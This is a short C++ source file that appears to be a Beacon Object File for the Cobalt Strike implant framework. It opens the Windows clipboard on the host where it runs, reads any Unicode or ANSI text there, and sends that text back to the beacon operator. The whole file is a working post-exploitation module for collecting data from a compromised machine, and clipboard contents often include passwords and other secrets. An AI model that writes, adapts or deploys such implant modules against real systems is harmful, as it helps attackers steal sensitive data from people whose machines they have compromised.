#include <general.h>

auto ClipboardDump( VOID ) -> VOID {
    if ( ! OpenClipboard( nullptr ) ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to open clipboard object" ); return;
    }
    
    HANDLE ClipContent = GetClipboardData( CF_UNICODETEXT );
    if ( ClipContent ) {
        WCHAR* ClipText = static_cast<WCHAR*>( GlobalLock( ClipContent ) );
        if ( ClipText ) {
            BeaconPrintf( CALLBACK_OUTPUT, "%S", ClipText );
            GlobalUnlock( ClipContent );
        }
    } else {
        ClipContent = GetClipboardData( CF_TEXT );
        if ( ClipContent ) {
            CHAR* ClipText = static_cast<CHAR*>( GlobalLock( ClipContent ) );
            if ( ClipText ) {
                BeaconPrintf( CALLBACK_OUTPUT, "%s", ClipText );
                GlobalUnlock( ClipContent );
            }
        }
    }
    
    CloseClipboard();
}

EXTERN_C auto go( CHAR* Args, INT32 Argc ) -> VOID {
    return ClipboardDump();
}